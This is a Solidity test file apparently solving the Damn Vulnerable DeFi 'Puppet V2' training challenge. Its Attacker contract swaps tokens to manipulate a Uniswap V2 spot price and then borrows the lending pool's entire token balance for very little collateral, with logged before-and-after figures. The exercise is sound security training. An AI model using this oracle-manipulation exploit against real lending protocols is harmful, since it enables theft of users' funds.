// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        Attacker atk = new Attacker{value: PLAYER_INITIAL_ETH_BALANCE}(address(token), address(lendingPool), address(uniswapV2Exchange), address(uniswapV2Router), address(weth), recovery);
        token.transfer(address(atk), PLAYER_INITIAL_TOKEN_BALANCE);      

        atk.attack(9999e18);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract Attacker {
    
    DamnValuableToken token;
    address weth;
    PuppetV2Pool lendingPool;
    IUniswapV2Pair uniswapV2Exchange;
    IUniswapV2Router02 uniswapV2Router;
    address recovery;
    constructor(address _token, address _lendingPool, address _uniswapV2Exchange, address _uniswapV2Router, address _weth, address _recovery) payable {
        token = DamnValuableToken(_token);
        lendingPool = PuppetV2Pool(_lendingPool);
        uniswapV2Exchange = IUniswapV2Pair(_uniswapV2Exchange);
        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
        weth = _weth;
        recovery = _recovery;
    }

    function attack(uint256 amount) external{
        uint dvtbalance = token.balanceOf(address(this));

        // Check balances: 
        // 20 WETH 
        // 10K DVT
        console.log("Attacker balances:");
        console.log("DVT: ", token.balanceOf(address(this)));
        console.log("WETH: ", address(this).balance);
        
        uint collateralNeedBefore = lendingPool.calculateDepositOfWETHRequired(1_000_000e18);

        // Needed ETH for draining lending Pool before attack:  300000000000000000000000

        // we want to manipulate reserves, in order to make puppet pool calculate favourable quote

        // uniswapV2Exchange pair: dvt, weth

        
        (uint112 reserve0, uint112 reserve1,) = uniswapV2Exchange.getReserves();
        console.log("Reserves of Uniswap DVT/ETH Pool:");
        console.log("ETH:", reserve0);
        console.log("DVT:", reserve1);
        // 10 ETH , 100 DVT

        console.log(lendingPool.calculateDepositOfWETHRequired(100e18) / 3);
        // 10.000000000000000000 the quote is 100 DVT = 10 ETH


        // Swapping all DVT we can for ETH to drain ETH reserves
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.approve(address(uniswapV2Router), dvtbalance);
        uniswapV2Router.swapExactTokensForETH(dvtbalance, 9e18, path, address(this), block.timestamp);


        // Checking DVT/ETH reserves after swap
        (reserve0, reserve1,) = uniswapV2Exchange.getReserves();

        console.log("Reserves of Uniswap DVT/ETH Pool:");
        console.log("ETH:", reserve0);
        console.log("DVT:", reserve1);

        /*console.log("Attacker balances:");
        console.log("DVT: ", token.balanceOf(address(this)));
        console.log("WETH: ", address(this).balance);*/
        //   DVT Balance:  0
        //  WETH Balance:  29900695134061569016

        uint collateralNeedAfter = lendingPool.calculateDepositOfWETHRequired(1_000_000e18);
        console.log("ETH Collateral for borrowing all 100k DTV before attack: ", collateralNeedBefore);
        console.log("ETH Collateral for borrowing all 100k DTV after attack:  ", collateralNeedAfter);
        // Needed ETH for draining lending Pool after attack:  29.496494833197321980


        // Converting ETH to WETH and approve to usage to lending pool so we can borrow all 100k DVT
        WETH(payable(weth)).deposit{value: address(this).balance}();
        WETH(payable(weth)).approve(address(lendingPool), type(uint256).max);
        
        lendingPool.borrow(1_000_000e18);

        token.transfer(recovery, token.balanceOf(address(this)));    
    }
    receive() external payable{}
}

